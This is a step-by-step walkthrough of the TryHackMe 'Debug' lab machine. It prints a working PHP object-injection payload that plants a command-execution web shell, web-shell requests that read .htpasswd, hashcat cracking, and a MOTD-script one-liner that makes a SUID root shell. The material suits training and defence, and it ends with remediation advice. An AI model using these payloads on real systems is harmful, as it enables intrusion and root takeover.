# TryHackMe: Debug - Machine Walkthrough

A step-by-step walkthrough of the **Debug** Linux machine on [TryHackMe](https://tryhackme.com/room/debug). This room covers web enumeration, source code review, PHP object injection through `unserialize()`, password cracking, and privilege escalation via a writable MOTD script.

> **Note:** This writeup is for learning purposes. Flags have been removed, as TryHackMe asks users not to publish flags or answers publicly. Work through the room yourself to capture them.

---

## Table of Contents

1. [Machine Overview](#machine-overview)
2. [Attack Chain](#attack-chain)
3. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4. [Phase 2: Web Enumeration](#phase-2-web-enumeration)
5. [Phase 3: Source Code Review](#phase-3-source-code-review)
6. [Phase 4: PHP Object Injection](#phase-4-php-object-injection)
7. [Phase 5: Remote Command Execution](#phase-5-remote-command-execution)
8. [Phase 6: Password Cracking](#phase-6-password-cracking)
9. [Phase 7: Initial Access](#phase-7-initial-access)
10. [Phase 8: Privilege Escalation](#phase-8-privilege-escalation)
11. [Remediation](#remediation)
12. [Lessons Learned](#lessons-learned)
13. [Tools Used](#tools-used)

---

## Machine Overview

| Field | Details |
|---|---|
| Machine | Debug |
| Platform | TryHackMe |
| Difficulty | Medium |
| OS | Ubuntu 16.04.6 LTS |
| Target | `<TARGET_IP>` (hostname `debug.thm`) |
| Key weaknesses | Exposed backups, PHP object injection, web-readable `.htpasswd`, weak password, writable MOTD script run as root |

## Attack Chain

```
Recon  ->  Enumeration  ->  Source review  ->  Object injection
  ->  Web shell RCE  ->  Hash cracking  ->  SSH as james  ->  Root via MOTD
```

---

## Phase 1: Reconnaissance

Start with a full TCP port scan with service and version detection.

```bash
nmap -sC -sV -p- --min-rate 5000 -T4 <TARGET_IP>
```

Two ports are open:

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.18 (Ubuntu) |

The default Apache page suggests the application is served under a virtual host. Map the hostname locally:

```bash
echo "<TARGET_IP> debug.thm" | sudo tee -a /etc/hosts
```

---

## Phase 2: Web Enumeration

Run directory brute forcing with two tools.

```bash
gobuster dir -u http://debug.thm \
  -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

feroxbuster -u http://debug.thm/ \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -k
```

Important findings:

| Path | Status | Notes |
|---|---|---|
| `/backup/` | 301 | Directory listing is enabled |
| `/backup/index.php.bak` | 200 | Backup of the PHP source code |
| `/backup/index.html.bak` | 200 | Backup of the HTML |
| `/message.txt` | 200 | Log file written by the form |
| `/index.php` | 200 | Main application |

---

## Phase 3: Source Code Review

Download `index.php.bak` from `/backup/` and read it. The file contains a class called `FormSubmit`:

- `$form_file` is set to `message.txt`.
- `SaveMessage()` builds a message from the `name`, `email`, and `comments` GET parameters.
- `__destruct()` writes the message to a file with `file_put_contents()` when the object is destroyed.

At the bottom of the file, the code does this:

```php
$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);
```

A developer comment says the code is for debugging only. Because user input goes straight into `unserialize()`, an attacker can supply their own object, and its `__destruct()` runs with attacker-chosen values. This is **PHP object injection**.

---

## Phase 4: PHP Object Injection

Create a serialized `FormSubmit` object whose `form_file` points to `message.php`, and whose `message` is a small web shell.

`script.php`:

```php
<?php
class FormSubmit {
    public $form_file = "message.php";
    public $message = '<?php system($_GET["cmd"]); ?>';
}
$obj = new FormSubmit;
echo serialize($obj);
?>
```

Generate the payload and send it through the `debug` parameter:

```bash
php script.php
```

```
http://debug.thm/index.php?debug=O:10:"FormSubmit":2:{s:9:"form_file";s:11:"message.php";s:7:"message";s:30:"<?php system($_GET["cmd"]); ?>";}
```

The server responds with *"Your submission has been successfully saved!"*, and `message.php` now exists in the web root.

---

## Phase 5: Remote Command Execution

Test the web shell:

```
http://debug.thm/message.php?cmd=ls
http://debug.thm/message.php?cmd=ls%20-alps
```

The listing shows a hidden file, `.htpasswd`, which is readable by anyone:

```
http://debug.thm/message.php?cmd=cat%20.htpasswd
```

The file contains a user `james` and an APR1 password hash.

---

## Phase 6: Password Cracking

The Apache `.htpasswd` format uses APR1 hashes, which are hashcat mode **1600**.

```bash
# hash.txt contains: james:$apr1$...
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

hashcat recovers the password within seconds. The password is a common dictionary word from `rockyou.txt`.

---

## Phase 7: Initial Access

Log in over SSH with the recovered credentials, then read the user flag from the home directory.

```bash
ssh james@<TARGET_IP>
cat ~/user.txt
```

The home directory also contains `Note-To-James.txt`. The note asks James to customize the SSH welcome message and says he has access to modify the system files. This is a hint toward the MOTD scripts.

---

## Phase 8: Privilege Escalation

Check the shell history and the MOTD directory:

```bash
cat ~/.bash_history
ls -alps /etc/update-motd.d/
```

The scripts in `/etc/update-motd.d/` run **as root** each time a user logs in over SSH. The file `00-header` is owned by root, but its group is `james` and the group has write permission, so james can add commands to it.

Append a line that copies bash and sets the SUID bit:

```bash
cd /etc/update-motd.d/
echo "cp /bin/bash /home/james/bash && chmod u+s /home/james/bash" >> 00-header
exit
```

Log in again so the MOTD script runs as root:

```bash
ssh james@<TARGET_IP>
ls -la ~            # bash is now owned by root with the SUID bit set
./bash -p           # -p keeps the effective root privileges
whoami              # root
cat /root/root.txt  # root flag
```

---

## Remediation

| Weakness | Fix |
|---|---|
| Backup files in the web root, directory listing enabled | Remove backups from the web root, disable `Options Indexes` |
| `unserialize()` on user input | Never unserialize untrusted data; use JSON |
| Debug code in production | Remove debug parameters before deployment |
| File writes inside `__destruct()` | Avoid magic methods that write files; whitelist names |
| `.htpasswd` readable by the web server | Store it outside the web root and deny dot-files |
| Weak password | Enforce a strong password policy and use SSH keys |
| Group-writable MOTD script run as root | `chmod 755` and `chown root:root` on `/etc/update-motd.d/*` |

---

## Lessons Learned

- **Enumerate thoroughly.** Backup files and leftover debug code often lead straight to the vulnerability.
- **Read the source when you can get it.** The `.bak` file made the whole web-app logic visible.
- **Check permissions at every step.** A group-writable file that runs as root is a full privilege escalation.
- **Never call `unserialize()` on user input.**

---

## Tools Used

- nmap
- gobuster
- feroxbuster
- hashcat
- rockyou.txt and SecLists wordlists
- nano, PHP CLI
- OpenSSH

---

## Author

**Nishant Saini**, BCA student and full-stack developer
GitHub: [github.com/nishantsaini5786](https://github.com/nishantsaini5786)

---

*For educational use only. Only attack systems you own or have explicit permission to test.*
